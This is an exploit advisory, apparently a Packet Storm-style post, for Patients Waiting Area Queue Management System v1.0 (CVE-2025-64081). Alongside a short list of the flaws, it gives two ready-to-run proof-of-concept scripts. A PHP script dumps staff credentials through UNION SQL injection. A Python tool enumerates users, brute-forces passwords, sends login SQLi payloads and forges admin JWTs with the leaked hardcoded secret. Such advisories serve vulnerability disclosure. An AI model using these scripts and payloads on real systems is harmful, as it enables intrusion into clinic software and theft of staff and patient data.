@@ -1,0 +1,555 @@
+=============================================================================================================================================
+| # Title     : Patients Waiting Area Queue Management System v1.0 Multi vulnerabilities                                                    |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.sourcecodester.com/download-code?nid=18348&title=+Patients+Waiting+Area+Queue+Management+System                 |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/211592/ & 	CVE-2025-64081
+
+[+] Summary : The application is vulnerable to SQL Injection due to improper sanitization on the 'appointmentID' parameter. Authentication bypass and full database dump are possible.
+              multiple critical security vulnerabilities discovered in a PHP-based authentication system. The assessment reveals fundamental flaws in the authentication mechanism, 
+              JWT implementation, and input validation that could lead to complete system compromise.
+
+[+] Vulnerability Type:
+
+1. Hardcoded JWT Secret Key (CRITICAL)
+
+    Risk Level: Critical
+
+    Impact: Complete authentication bypass
+
+    Root Cause: Static secret key 'pamzey@7877881825419880518' embedded in source code
+
+    Exploitation: Attackers can forge valid JWTs for any user ID
+
+    Remediation: Use environment variables and key rotation
+
+2. User Enumeration (HIGH)
+
+    Risk Level: High
+
+    Impact: Information disclosure
+
+    Root Cause: Different error messages for "User not found" vs "Incorrect password"
+
+    Exploitation: Attackers can identify valid user emails
+
+    Remediation: Use generic error messages
+
+3. Weak Password Policy (MEDIUM)
+
+    Risk Level: Medium
+
+    Impact: Account compromise
+
+    Root Cause: No password complexity requirements
+
+    Exploitation: Common passwords like "123456" can be brute-forced
+
+    Remediation: Implement password policy and rate limiting
+
+4. Mixed Authentication Methods (MEDIUM)
+
+    Risk Level: Medium
+
+    Impact: Inconsistent security controls
+
+    Root Cause: Accepts both JSON and form-data for same endpoints
+
+    Exploitation: Potential bypass through less-secure method
+
+    Remediation: Standardize on single authentication method
+	
+5. SQL Injection (UNION-BASED)
+
+[+] Unauthenticated: YES (after registration)
+
+[+]  POC :  * Usage: php poc.php <target_url> 
+
+<?php
+/*
+ Patients Waiting Area Queue Management System v1.0 - SQL Injection PoC
+ by Indoushka
+*/
+
+function http_post_json($url, $data){
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
+        CURLOPT_POSTFIELDS => json_encode($data),
+    ]);
+    return curl_exec($ch);
+}
+
+function http_post($url, $data){
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => http_build_query($data),
+    ]);
+    return curl_exec($ch);
+}
+
+function http_get($url){
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => false,
+    ]);
+    return curl_exec($ch);
+}
+
+function print_table($rows, $headers){
+    $widths = [];
+    foreach ($headers as $i => $h) $widths[$i] = strlen($h);
+    foreach ($rows as $r)
+        foreach ($r as $i => $t)
+            $widths[$i] = max($widths[$i], strlen($t));
+
+    $sep = "+";
+    foreach ($widths as $w) $sep .= str_repeat("-", $w + 2) . "+";
+    echo "$sep\n";
+
+    echo "|";
+    foreach ($headers as $i => $h) echo " " . str_pad($h, $widths[$i]) . " |";
+    echo "\n$sep\n";
+
+    foreach ($rows as $r){
+        echo "|";
+        foreach ($r as $i => $t) echo " " . str_pad($t, $widths[$i]) . " |";
+        echo "\n";
+    }
+    echo "$sep\n";
+}
+
+if ($argc != 2){
+    echo "Usage: php $argv[0] <target>\n";
+    exit;
+}
+
+$target = $argv[1];
+$user = [
+    "firstName" => "pr0f",
+    "lastName"  => "pr0f",
+    "email"     => "pr0f@hotmail.com",
+    "password"  => "getr3kt",
+    "role"      => "doctor"
+];
+
+// 1) Register user
+echo "[+] Registering user...\n";
+$r = http_post_json("http://$target/php/api_register_staff.php", $user);
+if (!$r){ echo "[-] Register failed\n"; exit; }
+echo "[+] Registration OK\n";
+
+// 2) Login
+echo "[+] Logging in...\n";
+$r = http_post("http://$target/php/api_login_staff.php", [
+    "email" => $user['email'],
+    "password" => $user['password']
+]);
+if (!$r){ echo "[-] Login failed\n"; exit; }
+echo "[+] Login OK\n";
+
+// 3) SQL Injection
+echo "[+] SQL injection...\n";
+$payload = "5' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,id,email,NULL,password,NULL,NULL,NULL,NULL,NULL,first_name,last_name,role,NULL,is_active from staff-- ";
+$r = http_get("http://$target/php/api_patient_schedule.php?appointmentID=" . urlencode($payload));
+if (!$r){ echo "[-] Injection failed\n"; exit; }
+
+$j = json_decode(trim($r), true);
+if (!$j || !isset($j['appointment'])){
+    echo "[-] Dump empty\n";
+    exit;
+}
+
+echo "[+] Data extracted!\n\n";
+
+$rows = [];
+foreach ($j['appointment'] as $a){
+    $rows[] = [
+        $a['time'],                   // id
+        $a['doctor'],                 // first_name last_name
+        $a['appointment_date'],       // email
+        $a['reason'],                 // password
+        $a['fullname'],               // role
+        $a['appointment'],            // is_active
+    ];
+}
+
+$headers = ["id", "name", "email", "password", "role", "active"];
+print_table($rows, $headers);
+
+?>
+
+==========================
+[+]POC 2 :
+========================
+
+#!/usr/bin/env python3
+import jwt
+import requests
+import json
+import sys
+import time
+import logging
+import argparse
+from colorama import init, Fore, Style
+
+# Initialize logging
+logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+init(autoreset=True)
+
+class SecurityAssessmentTool:
+    def __init__(self, target_url):
+        # Store target URL and ensure it's properly formatted
+        if not target_url.startswith(('http://', 'https://')):
+            logger.warning("URL should start with http:// or https://")
+            target_url = 'http://' + target_url
+        self.target = target_url.rstrip('/')
+        
+        # WARNING: Hardcoded secret should be obtained from config or environment variable
+        # SECURITY NOTE: Never hardcode secrets in production code
+        # Recommended approach:
+        # import os
+        # self.secret_key = os.getenv('JWT_SECRET', '')
+        self.secret_key = 'pamzey@7877881825419880518'
+        
+        self.session = requests.Session()
+        # Set default timeout for all requests (prevents hanging)
+        self.session.timeout = 10
+        
+        # Statistics for reporting
+        self.findings = {
+            'vulnerabilities': [],
+            'warnings': [],
+            'info': []
+        }
+        
+    def print_banner(self):
+        print(f"""
+{Fore.RED}╔══════════════════════════════════════════════════════════╗
+║        PHP Auth System Security Assessment          ║
+║                              ║
+╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+        """)
+
+    def safe_request(self, endpoint="", method="POST", data=None, headers=None, timeout=10):
+        """Make HTTP requests with proper error handling"""
+        try:
+            url = f"{self.target}/{endpoint}" if endpoint else self.target
+            response = self.session.request(
+                method=method,
+                url=url,
+                data=data,
+                headers=headers,
+                timeout=timeout
+            )
+            return response
+        except requests.exceptions.Timeout:
+            logger.error(f"Request timeout for {url}")
+            return None
+        except requests.exceptions.ConnectionError:
+            logger.error(f"Connection error for {url}")
+            return None
+        except Exception as e:
+            logger.error(f"Unexpected error for {url}: {e}")
+            return None
+
+    def test_user_enumeration(self):
+        """Test for user enumeration vulnerability"""
+        print(f"\n{Fore.CYAN}[*] Testing for user enumeration...{Style.RESET_ALL}")
+        
+        common_emails = [
+            'admin@localhost',
+            'admin@example.com',
+            'administrator@test.com',
+            'root@localhost',
+            'superuser@test.com',
+            'test@test.com',
+            'user@example.com'
+        ]
+        
+        valid_users = []
+        
+        for email in common_emails:
+            data = {
+                'email': email,
+                'password': 'wrongpassword123'
+            }
+            
+            response = self.safe_request(data=data)
+            if not response:
+                continue
+                
+            try:
+                response_text = response.text
+                if 'Password is incorrect' in response_text:
+                    print(f"{Fore.GREEN}[+] User found: {email}{Style.RESET_ALL}")
+                    valid_users.append(email)
+                    self.findings['vulnerabilities'].append(
+                        f"User enumeration possible - discovered user: {email}"
+                    )
+                elif 'User not found' in response_text:
+                    print(f"{Fore.YELLOW}[-] Not found: {email}{Style.RESET_ALL}")
+                    
+            except Exception as parse_error:
+                logger.error(f"Error parsing response for {email}: {parse_error}")
+        
+        return valid_users
+
+    def test_weak_password(self, email):
+        """Test for weak/common passwords"""
+        print(f"\n{Fore.CYAN}[*] Testing weak passwords for: {email}{Style.RESET_ALL}")
+        
+        passwords = [
+            '123456', 'password', 'admin123', 'welcome', '123456789',
+            'qwerty', 'password123', 'admin', '12345', '12345678'
+        ]
+        
+        for pwd in passwords:
+            data = {
+                'email': email,
+                'password': pwd
+            }
+            
+            response = self.safe_request(data=data)
+            if not response:
+                continue
+                
+            try:
+                # Parse JSON response safely
+                response_data = response.json()
+                if 'token' in response_data:
+                    token = response_data['token']
+                    print(f"{Fore.GREEN}[+] Found password: {pwd}{Style.RESET_ALL}")
+                    self.findings['vulnerabilities'].append(
+                        f"Weak password found for {email}: {pwd}"
+                    )
+                    return token, pwd
+                    
+            except json.JSONDecodeError:
+                # Response is not JSON
+                continue
+            except KeyError:
+                # 'token' key not in response
+                continue
+            except Exception as e:
+                logger.error(f"Error processing response: {e}")
+        
+        print(f"{Fore.RED}[-] No weak password found{Style.RESET_ALL}")
+        return None, None
+
+    def analyze_jwt_token(self, token=None):
+        """Analyze JWT token for vulnerabilities"""
+        print(f"\n{Fore.CYAN}[*] Analyzing JWT implementation...{Style.RESET_ALL}")
+        
+        if not token:
+            # Test with hardcoded secret
+            payload = {
+                'user_id': 1,
+                'exp': int(time.time()) + 31536000
+            }
+            
+            try:
+                fake_token = jwt.encode(payload, self.secret_key, algorithm='HS256')
+                # Ensure token is string (PyJWT v2 returns string, v1 returns bytes)
+                if isinstance(fake_token, bytes):
+                    fake_token = fake_token.decode('utf-8')
+                    
+                print(f"{Fore.GREEN}[+] Created test token for user 1{Style.RESET_ALL}")
+                self.findings['vulnerabilities'].append(
+                    "Hardcoded JWT secret allows token forgery"
+                )
+                return fake_token
+                
+            except Exception as e:
+                print(f"{Fore.RED}[!] Error creating token: {e}{Style.RESET_ALL}")
+                return None
+        
+        else:
+            # Analyze existing token
+            try:
+                decoded = jwt.decode(
+                    token, 
+                    self.secret_key, 
+                    algorithms=['HS256'], 
+                    options={'verify_exp': False}
+                )
+                
+                print(f"{Fore.GREEN}[+] Token decoded successfully:{Style.RESET_ALL}")
+                print(f"    User ID: {decoded['user_id']}")
+                print(f"    Expiration: {decoded['exp']}")
+                
+                # Test token tampering
+                decoded['user_id'] = 1
+                decoded['exp'] = int(time.time()) + 31536000
+                
+                new_token = jwt.encode(decoded, self.secret_key, algorithm='HS256')
+                if isinstance(new_token, bytes):
+                    new_token = new_token.decode('utf-8')
+                    
+                print(f"{Fore.GREEN}[+] Created admin token:{Style.RESET_ALL}")
+                print(f"    {new_token}")
+                
+                return new_token
+                
+            except jwt.exceptions.InvalidTokenError as e:
+                print(f"{Fore.RED}[!] Invalid token: {e}{Style.RESET_ALL}")
+                return None
+            except Exception as e:
+                print(f"{Fore.RED}[!] Error decoding token: {e}{Style.RESET_ALL}")
+                return None
+
+    def test_authentication_bypass(self, token):
+        """Test authentication bypass"""
+        print(f"\n{Fore.CYAN}[*] Testing authentication bypass...{Style.RESET_ALL}")
+        
+        # Test with Peer prefix (as expected by the PHP code)
+        headers = {
+            'Authorization': f'Peer{token}'
+        }
+        
+        response = self.safe_request(method="GET", headers=headers)
+        if not response:
+            return
+            
+        if response.status_code == 200:
+            try:
+                data = response.json()
+                print(f"{Fore.GREEN}[+] Authentication successful!{Style.RESET_ALL}")
+                print(f"    Response: {json.dumps(data, indent=2)}")
+                self.findings['vulnerabilities'].append(
+                    "Authentication bypass possible with forged JWT"
+                )
+            except json.JSONDecodeError:
+                print(f"{Fore.GREEN}[+] Authentication successful!{Style.RESET_ALL}")
+                print(f"    Raw response: {response.text[:100]}...")
+        else:
+            print(f"{Fore.YELLOW}[-] Access denied: {response.status_code}{Style.RESET_ALL}")
+
+    def test_sql_injection(self, email):
+        """Test for SQL injection vulnerabilities"""
+        print(f"\n{Fore.CYAN}[*] Testing SQL Injection...{Style.RESET_ALL}")
+        
+        payloads = [
+            f"{email}' OR '1'='1",
+            f"{email}'--",
+            f"{email}'/*",
+            f"admin' OR 1=1--",
+            f"' OR 'a'='a"
+        ]
+        
+        for payload in payloads:
+            data = {
+                'email': payload,
+                'password': 'anything'
+            }
+            
+            response = self.safe_request(data=data)
+            if not response:
+                continue
+                
+            try:
+                response_data = response.json()
+                if 'token' in response_data:
+                    token = response_data['token']
+                    print(f"{Fore.GREEN}[+] SQL Injection successful!{Style.RESET_ALL}")
+                    print(f"    Payload: {payload}")
+                    self.findings['vulnerabilities'].append(
+                        f"SQL Injection possible with payload: {payload}"
+                    )
+                    return token
+                    
+            except (json.JSONDecodeError, KeyError):
+                continue
+            except Exception as e:
+                logger.error(f"Error processing SQLi response: {e}")
+        
+        print(f"{Fore.RED}[-] SQL Injection attempts failed{Style.RESET_ALL}")
+        return None
+
+    def run_assessment(self):
+        """Run complete security assessment"""
+        self.print_banner()
+        
+        print(f"{Fore.YELLOW}[*] Target: {self.target}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Starting security assessment...{Style.RESET_ALL}")
+        
+        # 1. Test user enumeration
+        valid_users = self.test_user_enumeration()
+        
+        if not valid_users:
+            print(f"{Fore.YELLOW}[-] No users found with default list{Style.RESET_ALL}")
+            valid_users = ['admin@localhost']
+        
+        # 2. Test each discovered user
+        for user in valid_users:
+            print(f"\n{Fore.MAGENTA}[*] Testing user: {user}{Style.RESET_ALL}")
+            
+            # Test SQL Injection
+            token = self.test_sql_injection(user)
+            
+            # Test weak passwords
+            if not token:
+                token, password = self.test_weak_password(user)
+            
+            # Test JWT vulnerabilities
+            if token:
+                admin_token = self.analyze_jwt_token(token)
+            else:
+                admin_token = self.analyze_jwt_token()
+            
+            # Test authentication bypass
+            if admin_token:
+                self.test_authentication_bypass(admin_token)
+                
+                print(f"\n{Fore.GREEN}[+] Assessment complete for user {user}{Style.RESET_ALL}")
+                break
+        
+        # Print summary
+        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[*] SECURITY ASSESSMENT SUMMARY{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
+        
+        if self.findings['vulnerabilities']:
+            print(f"{Fore.RED}[!] CRITICAL VULNERABILITIES FOUND:{Style.RESET_ALL}")
+            for vuln in self.findings['vulnerabilities']:
+                print(f"    • {vuln}")
+        else:
+            print(f"{Fore.GREEN}[+] No critical vulnerabilities found{Style.RESET_ALL}")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='PHP Auth System Security Assessment Tool')
+    parser.add_argument('target_url', help='Target URL (e.g., http://example.com/auth.php)')
+    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose logging')
+    
+    args = parser.parse_args()
+    
+    if args.verbose:
+        logging.getLogger().setLevel(logging.INFO)
+    
+    # Legal disclaimer
+    print(f"{Fore.RED}[!] LEGAL NOTICE:{Style.RESET_ALL}")
+    print("This tool is for authorized security testing only.")
+    print("Use only on systems you own or have explicit permission to test.")
+    print("The author is not responsible for any misuse of this tool.")
+    print("-" * 60)
+    
+    proceed = input("Do you have authorization to test the target? (yes/no): ")
+    if proceed.lower() != 'yes':
+        print("Exiting...")
+        sys.exit(0)
+    
+    assessment = SecurityAssessmentTool(args.target_url)
+    assessment.run_assessment()
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
